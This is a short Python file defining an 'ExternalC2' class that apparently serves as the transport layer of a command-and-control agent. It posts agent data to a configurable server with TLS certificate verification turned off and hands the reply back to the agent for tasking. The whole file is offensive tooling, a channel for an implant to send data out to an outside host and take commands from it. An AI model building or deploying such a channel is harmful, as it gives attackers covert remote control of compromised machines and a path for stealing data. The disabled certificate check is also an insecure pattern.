import base64
import requests

class ExternalC2:
    Server: str = ''

    def __init__( self, server ) -> None:
        self.Server = server
        return

    def transmit( self, data ) -> bytes:
        agent_response = ''

        try:
            response = requests.post( self.Server, data=data, verify=False)
            print("[+] ExternalC2 response: " + response.text + "\n")
            agent_response = str(response.text)
        except Exception as e:
            print( f"[-] ExternalC2 exception: {e}" )

        return agent_response

